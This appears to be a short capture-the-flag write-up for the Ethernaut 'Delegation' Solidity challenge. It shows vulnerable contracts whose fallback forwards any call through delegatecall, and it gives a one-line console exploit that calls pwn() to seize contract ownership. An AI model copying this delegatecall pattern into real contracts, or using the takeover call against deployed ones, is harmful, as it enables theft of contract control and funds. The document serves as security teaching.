## Delegation 🤓

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```


When the delegatecall function executes code in another contract, it uses caller context but executes code in another contract.

In this challenge all you have to do is use the fallback function and call pwn in Delegate await contract.sendTransaction({data:web3.utils.keccak256('pwn()')})